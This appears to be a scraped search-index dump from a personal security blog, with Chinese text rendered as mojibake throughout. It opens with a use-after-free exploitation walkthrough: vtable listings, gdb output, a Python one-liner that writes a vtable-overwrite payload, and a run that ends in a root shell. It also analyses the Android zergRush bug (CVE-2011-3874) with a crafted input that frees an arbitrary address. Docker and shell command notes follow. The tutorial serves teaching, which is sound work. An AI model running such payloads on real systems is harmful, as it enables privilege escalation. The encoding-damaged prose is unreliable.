this-&gt;_vptr_Human = (int (**)(...))&amp;off_403D80; std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::operator=(&amp;this-&gt;name, p_name); this-&gt;age = age; } è·Ÿè¿›_vptr_Humançš„off_403D80å¤„ï¼Œå¯ä»¥çœ‹åˆ°mançš„è™šå‡½æ•°è¡¨ .data.rel.ro:0000000000403D70 ; `vtable for'Man .data.rel.ro:0000000000403D70 _ZTV3Man dq 0 ; offset to this .data.rel.ro:0000000000403D78 dq offset _ZTI3Man ; `typeinfo for'Man .data.rel.ro:0000000000403D80 off_403D80 dq offset _ZN5Human10give_shellEv .data.rel.ro:0000000000403D80 ; DATA XREF: Man::Man(std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;,int)+20â†‘o .data.rel.ro:0000000000403D80 ; Human::give_shell(void) .data.rel.ro:0000000000403D88 dq offset _ZN3Man9introduceEv ; Man::introduce(void) .data.rel.ro:0000000000403D90 public _ZTV5Human ; weak .data.rel.ro:0000000000403D90 ; `vtable for'Human .data.rel.ro:0000000000403D90 _ZTV5Human dq 0 ; offset to this .data.rel.ro:0000000000403D98 dq offset _ZTI5Human ; `typeinfo for'Human .data.rel.ro:0000000000403DA0 off_403DA0 dq offset _ZN5Human10give_shellEv .data.rel.ro:0000000000403DA0 ; DATA XREF: Human::Human(void)+Câ†‘o .data.rel.ro:0000000000403DA0 ; Human::~Human()+Câ†‘o .data.rel.ro:0000000000403DA0 ; Human::give_shell(void) .data.rel.ro:0000000000403DA8 dq offset _ZN5Human9introduceEv ; Human::introduce(void) .data.rel.ro:0000000000403DB0 ; public Woman : å¯ä»¥çœ‹åˆ°ï¼Œè™šå‡½æ•°è¡¨ä¸­0x0000000000403D80åœ°å€å°±æ˜¯manè™šå‡½æ•°æŒ‡é’ˆçš„å€¼ï¼Œè€Œm-&gt;introduce()è°ƒç”¨æ—¶ï¼Œè°ƒç”¨çš„å…¶å®æ˜¯0x0000000000403D80+0x8=0000000000403D88 ï¼Œ_vptr_Humanä¸ŠåŠ äº†0x8è°ƒç”¨åˆ°äº†introduceã€‚æˆ‘ä»¬æƒ³è¦è®©ä»–è°ƒç”¨åˆ°give_shellå°±åªéœ€è¦å°†_vptr_Humançš„å€¼è¦†ç›–ä¸º0x0000000000403D80-0x8=0x0000000000403D78 è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥é€šè¿‡gdbè°ƒè¯•çœ‹åˆ°ï¼Œæ‰“æ–­ç‚¹ä¹‹åinfo vtbl *må°±èƒ½çœ‹åˆ°å¯¹ç”¨çš„è™šå‡½æ•°çš„è¡¨ï¼Œæˆ–è€…ç›´æ¥æŸ¥çœ‹å˜é‡ç»“æ„ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ ¹æ®mçš„æŒ‡é’ˆå€¼ï¼Œçœ‹ä¸‹mançš„å†…å­˜ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€å—æ”¾çš„å°±æ˜¯è™šå‡½æ•°çš„æŒ‡é’ˆ0x00403d80 Starting program: /home/kali/uaf/uaf \\ Breakpoint 1, main (argc=1, argv=0x7fffffffe688) at uaf.cpp:54 54 cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; (gdb) p *m $1 = {_vptr.Human = 0x403d80 &lt;vtable for Man+16&gt;, age = 25, name = &quot;Jack&quot;} (gdb) info vtbl *m vtable for 'Human' @ 0x403d80 (subobject @ 0x416eb0): [0]: 0x40157e &lt;Human::give_shell()&gt; [1]: 0x401700 &lt;Man::introduce()&gt; (gdb) x /10 0x403d80 0x403d80 &lt;_ZTV3Man+16&gt;: 0x000000000040157e 0x0000000000401700 0x403d90 &lt;_ZTV5Human&gt;: 0x0000000000000000 0x0000000000403de0 0x403da0 &lt;_ZTV5Human+16&gt;: 0x000000000040157e 0x000000000040159a 0x403db0 &lt;_ZTI5Woman&gt;: 0x00007ffff7fa6c98 0x0000000000402087 0x403dc0 &lt;_ZTI5Woman+16&gt;: 0x0000000000403de0 0x00007ffff7fa6c98 (gdb) p m $3 = (Human *) 0x416eb0 (gdb) x /10x 0x416eb0 0x416eb0: 0x00403d80 0x00000000 0x00000019 0x00000000 0x416ec0: 0x00416ed0 0x00000000 0x00000004 0x00000000 0x416ed0: 0x6b63614a 0x00000000 ç°åœ¨æˆ‘ä»¬å·²ç»ç¡®è®¤äº† éœ€è¦48çš„ç©ºé—´ éœ€è¦æŠŠ_vptr_Human çš„å€¼è¦†ç›–ä¸º0x0000000000403D78 ç„¶åå°è¯•ä¸€ä¸‹ root@kali:/home/kali/uaf# python -c &quot;print('\\x78\\x3d\\x40\\x00\\x00\\x00\\x00\\x00')&quot; &gt; poc root@kali:/home/kali/uaf# ./uaf 48 poc 1. use 2. after 3. free 3 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 2 your data is allocated 1. use 2. after 3. free 1 # id uid=0(root) gid=0(root) groups=0(root) æ³¨æ„äº‹é¡¹ï¼šå¤ç°çš„æ—¶å€™è‡ªå·±ç¼–è¯‘è¦æ³¨æ„å…³æ‰PIE,ä¸ç„¶åœ°å€ä¼šè¢«éšæœºåŒ–å¤„ç†ï¼Œåªæœ‰ä½ä¸¤ä½å›ºå®š g++ uaf.cpp -o uaf -g -no-pie CVE-2011-3874-zergRush å®‰å“UAFæ¼æ´ï¼Œé€šè¿‡ç¼“å†²åŒºæº¢å‡ºï¼Œæ§åˆ¶freeä»»æ„åœ°å€ ä»£ç æ•´ä¸ªæµç¨‹å°±æ˜¯ä»dataä¸­è¯»å–æ•°æ®æ”¾å…¥tmpä¸­ï¼Œä»¥ç©ºæ ¼ä¸ºåˆ†å‰²ï¼Œç„¶åï¼Œè°ƒç”¨strdupç”³è¯·å†…å­˜å¤åˆ¶tmpä¸­å†…å®¹ï¼Œå°†æŒ‡é’ˆæ”¾å…¥argvæ•°ç»„ä¸­ï¼Œç„¶åå†å¯¹argvä¸­æ¯ä¸ªæŒ‡é’ˆè¿›è¡Œfreeæ“ä½œã€‚ void FrameworkListener::dispatchCommand(SocketClient *cli, char *data) { FrameworkCommandCollection::iterator i; int argc = 0; char *argv[FrameworkListener::CMD_ARGS_MAX]; char tmp[255]; char *p = data; char *q = tmp; bool esc = false; bool quote = false; int k; memset(argv, 0, sizeof(argv)); memset(tmp, 0, sizeof(tmp)); while(*p) { ... *q = *p++; //å‚æ•°æˆªå–åˆ†æ”¯ if (!quote &amp;&amp; *q == ' ') { *q = '\\0'; argv[argc++] = strdup(tmp); memset(tmp, 0, sizeof(tmp)); q = tmp; continue; } q++; } argv[argc++] = strdup(tmp); .... int j; for (j = 0; j &lt; argc; j++) free(argv[j]); return; } éœ€è¦å…³æ³¨ä¸€ç‚¹ï¼Œå­—ç¬¦æŒ‡é’ˆæ•°ç»„argvæ˜¯å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„ï¼Œé•¿åº¦æ˜¯16ã€‚ æ„é€ è¾“å…¥ cmd p1 p2 p3 p4 p5 p6 p7 p8 p9 p10 p11 p12 p13 p14 p15 p16 \\x78\\x56\\x34\\x12 å¯ä»¥å®ç°freeæ‰ 0x12345678å¤„çš„å†…å­˜ åˆ©ç”¨æº¢å‡ºfreeä»»æ„åœ°å€æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Œå…³é”®å°±æ˜¯ä»argvæº¢å‡ºåˆ°tmp åœ¨å¾ªç¯ä¸æ–­å­˜å…¥p15ä¹‹åï¼Œargvå·²ç»æ»¡äº†ï¼Œä¹‹åè¯»å…¥p16ï¼Œä¼šå°†p16çš„æŒ‡é’ˆå­˜å…¥tmp[0] - tmp[3]ï¼Œä¹‹åç»§ç»­è¯»å…¥æˆ‘ä»¬æ„é€ çš„åœ°å€ é¦–å…ˆï¼Œä¼šå°†åœ°å€å­˜å…¥tmpä¸­ï¼Œä¼šè¦†ç›–æ‰tmp[0] - tmp[3]ï¼Œä¹Ÿå°±æ˜¯å°†argv[16]å­˜æ”¾çš„æŒ‡é’ˆåœ°å€ç»™è¦†ç›–æ‰äº†ï¼Œä¹‹åå†å°†æ­¤å—æ•°æ®ç”³è¯·ä¸€å—å†…å­˜ï¼ŒæŠŠæŒ‡é’ˆç»™argv[17],å…¶å®ä¹Ÿæ˜¯tmpçš„tmp[4] - tmp[7] ä¹‹åå¾ªç¯freeçš„æ—¶å€™ï¼Œåœ¨free[argv[16]]çš„æ—¶å€™å°±ä¼šfreeæ‰æˆ‘ä»¬å†™å…¥çš„ç‰¹å®šåœ°å€ ä¹‹åå†æ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œæ‰§è¡Œåˆ°strdup(tmp)çš„æ—¶å€™å°±å¯ä»¥åˆ†é…ä¸€å—å¯æ§åˆ¶å¤§å°çš„å†…å­˜ï¼Œå¯ä»¥å°†åˆšæ‰freeæ‰çš„å†…å­˜åˆ†é…åˆ°ï¼Œç„¶åå¯¹è¿™å—å†…å­˜è¿›è¡Œå†™å…¥æ•°æ®ã€‚è¿›è¡Œåç»­çš„åˆ©ç”¨ å°ç»“ å­˜åœ¨æœ‰æŒ‡é’ˆåœ¨é‡Šæ”¾åè¿˜ä¼šè¢«ç»§ç»­ä½¿ç”¨çš„é€»è¾‘ å¯ä»¥æ§åˆ¶freeæ‰ä»»æ„æŒ‡é’ˆçš„å†…å­˜ï¼Œç„¶åå†ç”³è¯·è¯¥å†…å­˜ï¼Œå†™å…¥æ•°æ® ä¸¤ç§æƒ…å†µéƒ½ä¼šå¯¼è‡´UAFï¼Œç¬¬äºŒç§ä¼šæ¯”è¾ƒå°‘è§ä¹Ÿæ›´åŠ éšè”½ï¼Œä¸€èˆ¬éœ€è¦å…¶ä»–æ¼æ´æ‰èƒ½åšåˆ° ","link":"https://rainerhu.github.io/post/uaf/"},{"title":"å‘½ä»¤è®°å½•","content":"æ ‘è“æ´¾ æŸ¥çœ‹æ¸©åº¦ vcgencmd measure_temp centos é‡å¯ç½‘ç»œ service network restart screen å¸¸ç”¨å‘½ä»¤: screen -S name #åˆ›å»ºä¸€ä¸ªåå­—ä¸ºnameçš„ä¼šè¯ screen -r name #æ¢å¤åˆ°ç¦»å¼€å‰åˆ›å»ºçš„nameä¼šè¯çš„å·¥ä½œç•Œé¢ screen -ls screen #ä¼šåˆ—å‡ºå½“å‰å­˜åœ¨çš„ä¼šè¯åˆ—è¡¨ exit #ä¼šæç¤ºï¼š[screen is terminating]ï¼Œè¡¨ç¤ºå·²ç»æˆåŠŸé€€å‡ºscreenä¼šè¯ è¿œç¨‹æ¼”ç¤º é¦–å…ˆæ¼”ç¤ºè€…å…ˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ screen -S test åˆ›å»ºä¸€ä¸ªscreenä¼šè¯ï¼Œ è§‚ä¼—å¯ä»¥é“¾æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œscreen -x test è§‚ä¼—å±å¹•ä¸Šå°±ä¼šå‡ºç°å’Œæ¼”ç¤ºè€…åŒæ­¥ã€‚ cmder åˆ©ç”¨Tabï¼Œè‡ªåŠ¨è·¯å¾„è¡¥å…¨ï¼› åˆ©ç”¨Ctrl+Tå»ºç«‹æ–°é¡µç­¾ï¼›åˆ©ç”¨Ctrl+Wå…³é—­é¡µç­¾; åˆ©ç”¨Ctrl+Tabåˆ‡æ¢é¡µç­¾; Alt+F4ï¼šå…³é—­æ‰€æœ‰é¡µç­¾ Alt+Shift+1ï¼šå¼€å¯cmd.exe Alt+Shift+2ï¼šå¼€å¯powershell.exe Alt+Shift+3ï¼šå¼€å¯powershell.exe (ç³»ç»Ÿç®¡ç†å‘˜æƒé™) Ctrl+1ï¼šå¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬1ä¸ªé¡µç­¾ Ctrl+nï¼šå¿«é€Ÿåˆ‡æ¢åˆ°ç¬¬nä¸ªé¡µç­¾( nå€¼æ— ä¸Šé™) Alt + enterï¼š åˆ‡æ¢åˆ°å…¨å±çŠ¶æ€ï¼› Ctr+r å†å²å‘½ä»¤æœç´¢ git ä»£ç† git config --global --unset http.proxy git config --global --unset https.proxy git config --global http.proxy 'socks5://127.0.0.1:1086' git config --global https.proxy 'socks5://127.0.0.1:1086' ","link":"https://rainerhu.github.io/post/ming-ling-ji-lu/"},{"title":"dockerå¸¸ç”¨å‘½ä»¤è®°å½•","content":"åŸºç¡€ç±» æŸ¥çœ‹dockerä¿¡æ¯ # æŸ¥çœ‹dockerç‰ˆæœ¬ docker version # æ˜¾ç¤ºdockerç³»ç»Ÿçš„ä¿¡æ¯ docker info # æ—¥å¿—ä¿¡æ¯ docker logs # æ•…éšœæ£€æŸ¥ service docker status # å¯åŠ¨å…³é—­docker sudo service docker start|stop æ—¥å¿—ç±» æŸ¥çœ‹å®¹å™¨æ—¥å¿— docker logs -f &lt;å®¹å™¨åorID&gt; docker daemon æ—¥å¿—ä½ç½® æ ¹æ®ç³»ç»Ÿä¸åŒå„ä¸ç›¸åŒ * Ubuntu - /var/log/upstart/docker.log * Boot2Docker - /var/log/docker.log * Debian GNU/Linux - /var/log/daemon.log * CentOS - /var/log/daemon.log | grep docker * Fedora - journalctl -u docker.service * Red Hat Enterprise Linux Server - /var/log/messages | grep docker docker psæ²¡æœ‰å“åº” æ—¥å¿—æŸ¥è¯¢ # grep æ‰€æœ‰å®¹å™¨çš„config.json docker logs [conID] # ç¡®è®¤é—®é¢˜å # è¯¥config.json ä¸­æœ‰è¯¥å®¹å™¨1å·è¿›ç¨‹çš„pid kill -9 pid å®¹å™¨ç±» dockerå®¹å™¨å¯ä»¥ç†è§£ä¸ºåœ¨æ²™ç›’ä¸­è¿è¡Œçš„è¿›ç¨‹ã€‚ è¿™ä¸ªæ²™ç›’åŒ…å«äº†è¯¥è¿›ç¨‹è¿è¡Œæ‰€å¿…é¡»çš„èµ„æºï¼ŒåŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿã€ç³»ç»Ÿç±»åº“ã€shell ç¯å¢ƒç­‰ç­‰ã€‚ä½†è¿™ä¸ªæ²™ç›’é»˜è®¤æ˜¯ä¸ä¼šè¿è¡Œä»»ä½•ç¨‹åºçš„ã€‚ä½ éœ€è¦åœ¨æ²™ç›’ä¸­è¿è¡Œä¸€ä¸ªè¿›ç¨‹æ¥å¯åŠ¨æŸä¸€ä¸ªå®¹å™¨ã€‚è¿™ä¸ªè¿›ç¨‹æ˜¯è¯¥å®¹å™¨çš„å”¯ä¸€è¿›ç¨‹ï¼Œæ‰€ä»¥å½“è¯¥è¿›ç¨‹ç»“æŸçš„æ—¶å€™ï¼Œå®¹å™¨ä¹Ÿä¼šå®Œå…¨çš„åœæ­¢ã€‚ æŸ¥çœ‹å®¹å™¨ä¿¡æ¯ # æŸ¥çœ‹å½“å‰è¿è¡Œçš„å®¹å™¨ docker ps # æŸ¥çœ‹å…¨éƒ¨å®¹å™¨ docker ps -a # æŸ¥çœ‹å…¨éƒ¨å®¹å™¨çš„idå’Œä¿¡æ¯ docker ps -a -q # æŸ¥çœ‹ä¸€ä¸ªæ­£åœ¨è¿è¡Œå®¹å™¨è¿›ç¨‹ï¼Œæ”¯æŒ ps å‘½ä»¤å‚æ•° docker top # æŸ¥çœ‹å®¹å™¨çš„ç¤ºä¾‹id sudo docker inspect -f '{{.Id}}' [id] # æ£€æŸ¥é•œåƒæˆ–è€…å®¹å™¨çš„å‚æ•°ï¼Œé»˜è®¤è¿”å› JSON æ ¼å¼ docker inspect # è¿”å› ubuntu:14.04 é•œåƒçš„ docker ç‰ˆæœ¬ docker inspect --format '{{.DockerVersion}}' ubuntu:14.04 å®¹å™¨åŒæ­¥å‘½ä»¤ # ä¿å­˜å¯¹å®¹å™¨çš„ä¿®æ”¹ docker commit # å¯¹æ¯”å®¹å™¨çš„æ”¹åŠ¨ docker diff # é™„åŠ åˆ°ä¸€ä¸ªè¿è¡Œçš„å®¹å™¨ä¸Š docker attach å®¹å™¨æ“ä½œå‘½ä»¤ åˆ›å»ºåˆ é™¤å®¹å™¨ # åˆ›å»ºä¸€ä¸ªå®¹å™¨å‘½åä¸º test ä½¿ç”¨é•œåƒdaocloud.io/library/ubuntu docker create -it --name test daocloud.io/library/ubuntu # åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªå®¹å™¨ åä¸º test ä½¿ç”¨é•œåƒdaocloud.io/library/ubuntu docker run --name test daocloud.io/library/ubuntu # åˆ é™¤ä¸€ä¸ªå®¹å™¨ docker rm [å®¹å™¨id] # åˆ é™¤æ‰€æœ‰å®¹å™¨ docker rm `docker ps -a -q` # æ ¹æ®Dockerfile æ„å»º docker build -t [image_name] [Dockerfile_path] dockerå®¹å™¨éšç³»ç»Ÿè‡ªå¯ docker run --restart=always no â€“ é»˜è®¤å€¼ï¼Œå¦‚æœå®¹å™¨æŒ‚æ‰ä¸è‡ªåŠ¨é‡å¯ on-failure â€“ å½“å®¹å™¨ä»¥é 0 ç é€€å‡ºæ—¶é‡å¯å®¹å™¨,åŒæ—¶å¯æ¥å—ä¸€ä¸ªå¯é€‰çš„æœ€å¤§é‡å¯æ¬¡æ•°å‚æ•° (e.g. on-failure:10). always â€“ ä¸ç®¡é€€å‡ºç æ˜¯å¤šå°‘éƒ½è¦é‡å¯ å®¹å™¨èµ„æºé™åˆ¶å‚æ•° # é™åˆ¶å†…å­˜æœ€å¤§ä½¿ç”¨ -m 1024m --memory-swap=1024m # é™åˆ¶å®¹å™¨ä½¿ç”¨CPU --cpuset-cpus=&quot;0,1&quot; æŠŠä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨ä¿å­˜ä¸ºé•œåƒ docker commit &lt;CONTAIN-ID&gt; &lt;IMAGE-NAME&gt; å¯åŠ¨åœæ­¢å®¹å™¨ç­‰æ“ä½œ docker start|stop|restart [id] # æš‚åœ|æ¢å¤ æŸä¸€å®¹å™¨çš„æ‰€æœ‰è¿›ç¨‹ docker pause|unpause [id] # æ€æ­»ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡å®šå®¹å™¨è¿›ç¨‹ docker kill -s KILL [id] # åœæ­¢å…¨éƒ¨è¿è¡Œçš„å®¹å™¨ docker stop `docker ps -q` # æ€æ‰å…¨éƒ¨è¿è¡Œçš„å®¹å™¨ docker kill -s KILL `docker ps -q` äº¤äº’å¼è¿›å…¥å®¹å™¨ sudo docker exec -it {{containerName or containerID}} bash æŸ¥çœ‹å®¹å™¨çš„rootç”¨æˆ·å¯†ç  docker logs &lt;å®¹å™¨åorID&gt; 2&gt;&amp;1 | grep '^User: ' | tail -n1 å› ä¸ºDockerå®¹å™¨å¯åŠ¨æ—¶çš„rootç”¨æˆ·çš„å¯†ç æ˜¯éšæœºåˆ†é…çš„ã€‚æ‰€ä»¥ï¼Œé€šè¿‡è¿™ç§æ–¹å¼å°±å¯ä»¥å¾—åˆ°å®¹å™¨çš„rootç”¨æˆ·çš„å¯†ç äº† å®¹å™¨äºå®¿ä¸»æ‹·è´æ–‡ä»¶ docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|- docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH # æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°å¯¹åº”å®¹å™¨çš„ç›®å½• docker cp local.sh [CONTAINERid]:[TagPath] æ­¤å‘½ä»¤ä¸ºé«˜ç‰ˆæœ¬dockeræ‰æœ‰ï¼Œå½“ç„¶1.11+è‚¯å®šåŒ…å« è¿è¡Œä¸€ä¸ªæ–°å®¹å™¨ï¼ŒåŒæ—¶ä¸ºå®ƒå‘½åã€ç«¯å£æ˜ å°„ã€æ–‡ä»¶å¤¹æ˜ å°„ ä»¥redmineé•œåƒä¸ºä¾‹ docker run --name redmine -p 9003:80 -p 9023:22 -d -v /var/redmine/files:/redmine/files -v /var/redmine/mysql:/var/lib/mysql sameersbn/redmine ä¸€ä¸ªå®¹å™¨è¿æ¥åˆ°å¦ä¸€ä¸ªå®¹å™¨ docker run -i -t --name sonar -d -link mmysql:db tpires/sonar-server sonar å¯¼å…¥å¯¼å‡ºå®¹å™¨ # æ”¯æŒè¿œç¨‹æ–‡ä»¶ .tar, .tar.gz, .tgz, .bzip, .tar.xz, .txz docker import # å¯¼å‡º docker export [id] &gt;~/Downloads/ubuntu_nexus.tar å¯¼å‡ºåå¯¼å…¥ï¼ˆexported-imported)ï¼‰çš„å®¹å™¨ä¼šä¸¢å¤±æ‰€æœ‰çš„æäº¤å†å²ï¼Œæ— æ³•å›æ»šã€‚ é•œåƒæ“ä½œ è¿œç¨‹é•œåƒ docker login docker search # æœç´¢å¤„æ”¶è—æ•°ä¸å°äº 3 ï¼Œå¹¶ä¸”èƒ½å¤Ÿè‡ªåŠ¨åŒ–æ„å»ºçš„ django é•œåƒï¼Œå¹¶ä¸”å®Œæ•´æ˜¾ç¤ºé•œåƒæè¿° docker search -s 3 --automated --no-trunc django docker pull # æ‹‰å–ubuntuæœ€æ–°çš„é•œåƒ docker pull ubuntu:latest # æœåŠ¡å™¨æ‹‰å–ä¸ªäººåŠ¨æ€ï¼Œå¯é€‰æ‹©æ—¶é—´åŒºé—´ docker events # æ‹‰å–ä¸ªäººä» 2015/07/20 åˆ° 2015/08/08 çš„ä¸ªäººåŠ¨æ€ docker events --since=&quot;20150720&quot; --until=&quot;20150808&quot; é•œåƒåŒæ­¥æ“ä½œ # æ ‡è®°æœ¬åœ°é•œåƒï¼Œå°†å…¶å½’å…¥æŸä¸€ä»“åº“ docker tag # å°† ID ä¸º 5db5f84x1261 çš„å®¹å™¨æ ‡è®°ä¸º mine/lnmp:0.2 é•œåƒ docker tag 5db5f84x1261 mine/lnmp:0.2 # å°†é•œåƒæ¨é€è‡³è¿œç¨‹ä»“åº“ï¼Œé»˜è®¤ä¸º Docker Hub docker push æœ¬åœ°é•œåƒ # åˆ—å‡ºæœ¬åœ°æ‰€æœ‰é•œåƒ docker images # æœ¬åœ°é•œåƒåä¸º ubuntu çš„æ‰€æœ‰é•œåƒ docker images ubuntu # æŸ¥çœ‹æŒ‡å®šé•œåƒçš„åˆ›å»ºå†å² docker history [id] # æœ¬åœ°ç§»é™¤ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡å®šçš„é•œåƒ docker rmi # ç§»é™¤æœ¬åœ°å…¨éƒ¨é•œåƒ docker rmi `docker images -a -q` # æŒ‡å®šé•œåƒä¿å­˜æˆ tar å½’æ¡£æ–‡ä»¶ï¼Œ docker load çš„é€†æ“ä½œ docker save # å°†é•œåƒ ubuntu:14.04 ä¿å­˜ä¸º ubuntu14.04.tar æ–‡ä»¶ docker save -o ubuntu14.04.tar ubuntu:14.04 # ä» tar é•œåƒå½’æ¡£ä¸­è½½å…¥é•œåƒï¼Œ docker save çš„é€†æ“ä½œ docker load # ä¸Šé¢å‘½ä»¤çš„æ„æ€æ˜¯å°† ubuntu14.04.tar æ–‡ä»¶è½½å…¥é•œåƒä¸­ docker load -i ubuntu14.04.tar docker load &lt; /home/save.tar # æ„å»ºè‡ªå·±çš„é•œåƒ docker build -t &lt;é•œåƒå&gt; &lt;Dockerfileè·¯å¾„&gt; docker build -t xx/gitlab . ä¿å­˜åå†åŠ è½½ï¼ˆsaved-loadedï¼‰çš„é•œåƒä¸ä¼šä¸¢å¤±æäº¤å†å²å’Œå±‚ï¼Œå¯ä»¥å›æ»š é‡æ–°æŸ¥çœ‹containerçš„stdout # å¯åŠ¨topå‘½ä»¤ï¼Œåå°è¿è¡Œ $ ID=$(sudo docker run -d ubuntu /usr/bin/top -b) # è·å–æ­£åœ¨runningçš„containerçš„è¾“å‡º $ sudo docker attach $ID top - 02:05:52 up 3:05, 0 users, load average: 0.01, 0.02, 0.05 Tasks: 1 total, 1 running, 0 sleeping, 0 stopped, 0 zombie Cpu(s): 0.1%us, 0.2%sy, 0.0%ni, 99.7%id, 0.0%wa, 0.0%hi, 0.0%si, 0.0%st Mem: 373572k total, 355560k used, 18012k free, 27872k buffers Swap: 786428k total, 0k used, 786428k free, 221740k cached ^C$ $ sudo docker stop $ID docker run åå°è¿è¡Œ(-d)ã€å¹¶æš´éœ²ç«¯å£ å¦‚æœæƒ³è¦å…¶ä»–ä¸»æœºè®¿é—®,ä¸èƒ½ä½¿ç”¨127.0.0.1éœ€è¦ä½¿ç”¨0.0.0.0ä½œä¸ºipåœ°å€ 127.0.0.1ä»…èƒ½ä¸»æœºè®¿é—®,æ˜¯å›ç¯åœ°å€ docker run -d -p 127.0.0.1:33301:22 centos6-ssh run å‘½ä»¤è¯¦è§£ -a, --attach=[] Attach to STDIN, STDOUT or STDERR æŒ‡å®šæ ‡å‡†è¾“å…¥è¾“å‡ºå†…å®¹ç±»å‹ï¼Œå¯é€‰ STDIN/STDOUT/STDERR ä¸‰é¡¹ --add-host=[] Add a custom host-to-IP mapping (host:ip) --blkio-weight=0 Block IO (relative weight), between 10 and 1000 -c, --cpu-shares=0 CPU shares (relative weight) --cap-add=[] Add Linux capabilities --cap-drop=[] Drop Linux capabilities --cgroup-parent= Optional parent cgroup for the container --cidfile= Write the container ID to the file --cpu-period=0 Limit CPU CFS (Completely Fair Scheduler) period --cpu-quota=0 Limit the CPU CFS quota --cpuset-cpus= CPUs in which to allow execution (0-3, 0,1) ç»‘å®šå®¹å™¨åˆ°æŒ‡å®šCPUè¿è¡Œ --cpuset-mems= MEMs in which to allow execution (0-3, 0,1) ç»‘å®šå®¹å™¨åˆ°æŒ‡å®šMEMè¿è¡Œ -d, --detach=false Run container in background and print container ID åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨ID --device=[] Add a host device to the container --dns=[] Set custom DNS servers æŒ‡å®šå®¹å™¨ä½¿ç”¨çš„DNSæœåŠ¡å™¨ï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ --dns-search=[] Set custom DNS search domains æŒ‡å®šå®¹å™¨DNSæœç´¢åŸŸåï¼Œé»˜è®¤å’Œå®¿ä¸»ä¸€è‡´ -e, --env=[] Set environment variables è®¾ç½®ç¯å¢ƒå˜é‡ --entrypoint= Overwrite the default ENTRYPOINT of the image --env-file=[] Read in a file of environment variables ä»æŒ‡å®šæ–‡ä»¶è¯»å…¥ç¯å¢ƒå˜é‡ --expose=[] Expose a port or a range of ports -h, --hostname= Container host name æŒ‡å®šå®¹å™¨çš„hostname --help=false Print usage -i, --interactive=false Keep STDIN open even if not attached ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ --ipc= IPC namespace to use -l, --label=[] Set meta data on a container --label-file=[] Read in a line delimited file of labels --link=[] Add link to another container --log-driver= Logging driver for container --log-opt=[] Log driver options --lxc-conf=[] Add custom lxc options -m, --memory= Memory limit --mac-address= Container MAC address (e.g. 92:d0:c6:0a:29:33) --memory-swap= Total memory (memory + swap), '-1' to disable swap --name= Assign a name to the container ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§° --net=bridge Set the Network mode for the container æŒ‡å®šå®¹å™¨çš„ç½‘ç»œè¿æ¥ç±»å‹ï¼Œæ”¯æŒ bridge/host/none/container:&lt;name|id&gt; å››ç§ç±»å‹ --oom-kill-disable=false Disable OOM Killer -P, --publish-all=false Publish all exposed ports to random ports -p, --publish=[] Publish a container's port(s) to the host --pid= PID namespace to use --privileged=false Give extended privileges to this container --read-only=false Mount the container's root filesystem as read only --restart=no Restart policy to apply when a container exits --rm=false Automatically remove the container when it exits --security-opt=[] Security Options --sig-proxy=true Proxy received signals to the process -t, --tty=false Allocate a pseudo-TTY ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ -u, --user= Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;]) --ulimit=[] Ulimit options --uts= UTS namespace to use -v, --volume=[] Bind mount a volume --volumes-from=[] Mount volumes from the specified container(s) -w, --workdir= Working directory inside the container å­˜åœ¨çš„é—®é¢˜è§£å†³æ–¹æ³• ubuntu14ä¸‹çš„dockeræ˜¯æ²¡æœ‰serviceæœåŠ¡ å»é™¤æ¯æ¬¡sudoè¿è¡Œdockerå‘½ä»¤ï¼Œéœ€è¦æ·»åŠ ç»„ # Add the docker group if it doesn't already exist. $ sudo groupadd docker #æ”¹å®Œåéœ€è¦é‡æ–°ç™»é™†ç”¨æˆ· $ sudo gpasswd -a ${USER} docker Dockerfileä¸­çš„EXPOSEã€docker run --exposeã€docker run -pä¹‹é—´çš„åŒºåˆ« Dockerfileçš„EXPOSEç›¸å½“äºdocker run --exposeï¼Œæä¾›containerä¹‹é—´çš„ç«¯å£è®¿é—® docker run -på…è®¸containerå¤–éƒ¨ä¸»æœºè®¿é—®containerçš„ç«¯å£ ubuntu14çš„febootstrapæ²¡æœ‰-iå‘½ä»¤ ä½œè€…ï¼šæ³›åŸç½ª é“¾æ¥ï¼šhttp://www.jianshu.com/p/adaa34795e64 ä¾†æºï¼šç®€ä¹¦ ","link":"https://rainerhu.github.io/post/docker-chang-yong-ming-ling-ji-lu/"},{"title":"SSS redirect","content":"æŠŠSSS redirect åˆ°äº†æˆ‘VPSçš„wordpressä¸Šå»äº†,ç„¶å,æˆ‘éƒé—·çš„å‘ç°æ²¡æ³•è®°å½•è®¿å®¢ipåœ°å€, å…¨tmæ˜¯æˆ‘è‡ªå·±çš„ipæˆ–è€…'127.0.0.1' '(:3ã€âˆ )'æƒ³die 